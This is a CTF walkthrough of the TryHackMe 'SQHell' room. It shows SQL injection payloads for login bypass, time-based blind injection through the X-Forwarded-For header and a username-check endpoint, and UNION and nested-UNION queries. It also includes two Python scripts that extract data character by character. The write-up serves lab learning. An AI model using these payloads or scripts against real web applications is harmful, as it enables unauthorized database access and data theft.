---
date: 2025-02-15
categories: [CTF, THM]
title: "THM - SQHell"
tags: ['privilege escalation', 'python', 'rce', 'sqli', 'tryhackme', 'hackthebox', 'immersivelabs', 'thm', 'iml', 'htb']

description: "SQHell - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# THM - SQHell


![image1](../resources/530de1dfca98475080f14f1d7e48ee62.png)
**<u>Flag 1 - Login Bypass</u>**


![image2](../resources/ed9e0da004f14ba7b2fd6495e7158d25.png)

- When we try and register as admin - it confirms that the username is already taken:

![image3](../resources/61e755ba802f48d4bf89badd00df0ff7.png)

- But we can't register anyways:

![image4](../resources/b0392f8defc041e89c6bbc88f5457d82.png)

- We can bypass the login with a simple ' OR 1=1 -- remember the space after --
And use anything for password

- Flag 1:

![image5](../resources/1ef40e4ef2ac4d749825917652fb1557.png)

**<u>Flag 2 - Time Based Blind - X-Forwarded-For (Logging IP)</u>**

- We get a hint:
*"Make sure to read the terms and conditions ;)"*

- Looking at the T&C - it gives a hint that they log your IP address

![image6](../resources/30f6efff32544cd69ab94fad27b9f6c7.png)
- The HTTP header used for this is **X-Forwarded-For**

![image7](../resources/0c036c86974b41509e5e6298a69fc4b9.png)

- We can build our request by adding the header

- I tried a bunch of SQLi commands but nothing works...
But I then turned my focus to time based blind sqli

Normal basic ones didn't work but here:

[https://infosecwriteups.com/sql-injection-payload-list-b97656cfd66b](https://infosecwriteups.com/sql-injection-payload-list-b97656cfd66b)

We find a whole list of ones and I tested a few that works

- This Time based one worked for instance:

```bash
'AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe

```

![image8](../resources/5b17fa54594344ffb600c49cf4830817.png)

- We can see the delay:

![image9](../resources/1c58b60f3be74c7d9ead0cdcb14a011f.png)

- To build on this query we can do:

```bash
' AND (SELECT sleep(5) from information_schema.tables where table_schema = "sqhell_1") and '1'='1

```

![image10](../resources/fc310998aabc4c44bcc01a5121e5dd6a.png)

**<u>What we know:</u>**
We can see that this db name is sqhell_5. And since I enumerated flag 5 first, in sqhell_5 db.

We can assume that this flag is in the table "flag" as well

The flags start with THM

The length of the flags seem to be 42 characters

- We can test if this is the case:

```bash
' AND (SELECT sleep(5) FROM flag where SUBSTR(flag,1,1) = 'T') and '1'='1

```

![image11](../resources/c112f277fabd4bd686e1f6fa9b111730.png)

(Upper or lowercase T, doesn't matter)

- Now that we know all this - we need to form a script to exploit this (or do it manually):

![image12](../resources/8b572b13fa1f4c1fb6533857d090191d.png)

**<u>Script:</u>**

```python
import requests
import sys
import time
import string

def send_payload(ip, payload):
    start = time.time()
    try:
        header = {'X-Forwarded-For': "1" + payload}
        r = requests.get(f"http://{ip}/", headers=header)
        end = time.time()
        if end - start >= 1:
            return True
        else:
            return False
    except Exception as e:
        print("Error:", e)
        return False

def brute_flag(ip):
    sys.stdout.write("Dumping: ")
    sys.stdout.flush()
    flag = ""
    characters = string.ascii_uppercase + string.digits + "{}:"
    for i in range(1, 44):  # Assumes the flag length is 43 characters
        for j in characters:
            payload = f"' AND (SELECT sleep(1) FROM flag WHERE SUBSTR(flag,{i},1) = '{j}') AND '1'='1"
            if send_payload(ip, payload):
                flag += j
                sys.stdout.write(j)
                sys.stdout.flush()
                break
    sys.stdout.write("\n")
    sys.stdout.flush()
    return flag

def main():
    if len(sys.argv) != 2:
        print("Usage: python %s <ip>" % sys.argv[0])
        sys.exit(1)
    ip = sys.argv[1]
    flag = brute_flag(ip)
    print("Flag:", flag)

if __name__ == "__main__":
    main()

```

**<u>Flag 3 - Time Based Blind</u>**

- The registration page validates a username in real time:

![image13](../resources/8cb6f317074645869f218e68b7680b58.png)

- We can verify with the source code on the registration page:

![image14](../resources/d14e5d445ca5471197b51e0e0f6f92c2.png)

- Capture the request in Burp:

![image15](../resources/c5a3d36906a3442bb27997dd570aef03.png)

- Nothing gets displayed so simple union isn't going to work

- I tried the same SQL time-based blind query from flag 2:

```bash
'AND (SELECT \* FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe

```
And it worked!

- So all we need to do is modify the script a bit:

![image16](../resources/6c36d817008b493c9f4253e239678d45.png)

**<u>Script:</u>**

```python
import requests
import sys
import time
import string

def send_payload(ip, payload):
    start = time.time()
    try:
        url = f"http://{ip}/register/user-check?username=admin{payload}"
        r = requests.get(url)
        end = time.time()
        if end - start >= 1:
            return True
        else:
            return False
    except Exception as e:
        print("Error:", e)
        return False

def brute_flag(ip):
    sys.stdout.write("Dumping: ")
    sys.stdout.flush()
    flag = ""
    characters = string.ascii_uppercase + string.digits + "{}:"
    for i in range(1, 44):  # assuming flag length = 43
        for j in characters:
            payload = f"' AND (SELECT sleep(1) FROM flag WHERE SUBSTR(flag,{i},1) = '{j}') AND '1'='1"
            if send_payload(ip, payload):
                flag += j
                sys.stdout.write(j)
                sys.stdout.flush()
                break
    sys.stdout.write("\n")
    sys.stdout.flush()
    return flag

def main():
    if len(sys.argv) != 2:
        print("Usage: python %s <ip>" % sys.argv[0])
        sys.exit(1)

    ip = sys.argv[1]
    flag = brute_flag(ip)
    print("Flag:", flag)

if __name__ == "__main__":
    main()

```


**<u>Flag 4 - SQL UNION Inception</u>**

Hint:
*"Well, dreams, they feel real while we're in them right?"*

- The only directory we haven't looked at is /user

![image17](../resources/a2818b74dbd14e40bac93271131997dd.png)
- If we edit the query in Burp - we can actually use the simple UNION query to determine the number of columns:

```bash
union select 1,2,3 -- -

```
(No quote ' gets used because id is an int)


![image18](../resources/fac0a6d3ecb34843a120667916a65353.png)

Although nothing gets displayed on the page

- The weird thing is, if we choose a user id that doesn't exist and we add the UNION query onto it:

![image19](../resources/64715ec68a9840c48843edb6463e1d60.png)

**The "1" and "2" gets reflected in the page**

- So if we want to enumerate the database:

```bash
union select database(),2,3 -- -

```

![image20](../resources/6a97cfc8f61849869b0673206acbff2b.png)

- Using the UNION command on its own didn't work here:
union select 1,group_concat(flag),3 from flag -- -

- The hint is a quote from the movie **Inception**

- If we follow the hint and try to add a query inside a query:

```bash
union select "1 union select 1",2,3 -- -

```
It works but no posts are displayed


![image21](../resources/8374d5ee354b4a4b9fc54f62aa7457b8.png)

- If we build the UNION query like normal to determine the number of columns displayed:

```bash
union select "1 union select 1,2,3,4",2,3 -- -

```

![image22](../resources/4257101eec744838a8f17926e4465533.png)

When we get to 4 columns - another post field is displayed, reflecting the number 2

- If we now try to view the flag:

```bash
union select "1 union select 1,flag,3,4 from flag",2,3 -- -

```

![image23](../resources/95f367e7b63443bca75cc7b6e0fbfd61.png)


![image24](../resources/af1ad39b34c6461a9ee1c468d73c9661.png)

**<u>Flag 5 - Error based (kind of)</u>**

- On the home screen, we get a blog with user posts:


![image25](../resources/bae99efe45e24c3d80d3d3b4bffef9d2.png)
- We can break the database on the post= parameter with a simple single quote **'** :

![image26](../resources/a685fdb53a214a4fb7fe738279b118b6.png)

- We can see the SQL db being used (**MySQL**)

- Now we can test, since we know this isn't blind:
Using ORDER BY 5 breaks the db


![image27](../resources/48740c172c2c4534a16f3ffa64923e5e.png)

- But ORDER BY 4 - works:

![image28](../resources/efb8d530f10f49159c86462d38f8bd2a.png)

- So we know there are **4 parameters being displayed**

- But when we try and use UNION SELECT 1,2,3,4 - none of the numbers appear:

![image29](../resources/b2406d7d1d2e43b98e2e0dc69857c9e4.png)

- If we go to a post that doesn't exist ie. post=0
We get a "Post not Found" error


![image30](../resources/cdc7897c4d16467d9d991b2d7b948778.png)

- Now if we try UNION SELECT 1,2,3,4 again we get an output - we see that parameters 2 and 3 are displayed:

![image31](../resources/d2a4ceb89d594f129abac025febb001b.png)

**<u>Enumeration:</u>**

- Using UNION SELECT 1,version(),database(),4 we can get the:
db name - **sqhell_5**

version (ubuntu) - **8.0.23**


![image32](../resources/d868b6ca3705408791dc268eaf48efaf.png)

- Building on that we can get the table names:

```bash
UNION SELECT 1,group_concat(table_name),3,4 from information_schema.tables where table_schema = "sqhell_5"

```

![image33](../resources/3b3aa535a5194ea0bb10956e1d89b989.png)

- **Can also use the INNODB_DATAFILES technique:**
**union all select 1,group_concat(PATH,"\n"),3,4 from information_schema.INNODB_DATAFILES**

- Query columns:

```bash
UNION SELECT 1,group_concat(column_name),3,4 from information_schema.columns where table_name = "flag"

```

![image34](../resources/53932b23a18c4e5e8369235ace11ff60.png)

- Get flag:

```bash
UNION SELECT 1,group_concat(flag),3,4 from flag

```

![image35](../resources/87f3fb976e5746da9c0374f4e63ca686.png)